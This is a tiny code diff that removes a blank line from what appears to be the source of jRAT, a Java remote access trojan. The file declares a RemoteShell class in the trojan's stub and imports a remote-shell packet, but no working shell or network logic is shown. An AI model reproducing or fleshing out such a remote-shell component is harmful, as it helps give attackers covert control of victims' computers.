@@ -6,7 +6,6 @@ import java.io.InputStreamReader;
 import pro.jrat.common.OperatingSystem;
 import pro.jrat.stub.packets.outgoing.Packet21RemoteShell;
 
-
 public class RemoteShell extends Thread {
 
 	public static Process p;
